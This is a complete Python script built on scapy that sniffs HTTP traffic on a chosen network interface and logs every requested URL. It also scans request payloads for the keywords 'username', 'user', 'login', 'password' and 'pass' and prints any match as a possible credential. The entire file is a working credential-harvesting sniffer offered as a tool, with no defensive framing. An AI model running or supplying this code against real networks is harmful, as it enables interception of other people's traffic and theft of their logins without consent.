# Built-in imports
import argparse
 
# Third-party imports
import scapy.all as scapy
from scapy.layers import http




def sniff(interface):
  """Sniffs packet on the given interface.
  """
  scapy.sniff(
    iface=interface,
    store=False,
    prn=processSniffedPacket,
    # filter="udp"
  )


def getUrl(packet):
  urla = packet[http.HTTPRequest].Host.decode("utf-8", "replace")
  urlb = packet[http.HTTPRequest].Path.decode("utf-8", "replace")
  return f"{urla}{urlb}"

 
def getLogin(packet):
  if packet.haslayer(http.Raw):
    load = packet[scapy.Raw].load.decode("utf-8", "replace")
    keywords = ["username", "user", "login", "password", "pass"]
    for keyword in keywords:
      if keyword in load:
        return load


def processSniffedPacket(packet):
  """Process the given packet.
  """
  if packet.haslayer(http.HTTPRequest):
    print(f"[+] HTTP Request >> {getUrl(packet)}")
    loginInfo = getLogin(packet)
    if loginInfo:
      print(f"[+] Possible username/password > {loginInfo}\n")


def syntaxCreator():
  """Creates the command's syntax object and returns it.
  """
  parser = argparse.ArgumentParser()
  parser.add_argument("-i", "--interface", default="wlp2s0", type=str, help="Interface to use.")
  return parser.parse_args()


if __name__ == "__main__":
  args = syntaxCreator()

  sniff(args.interface)
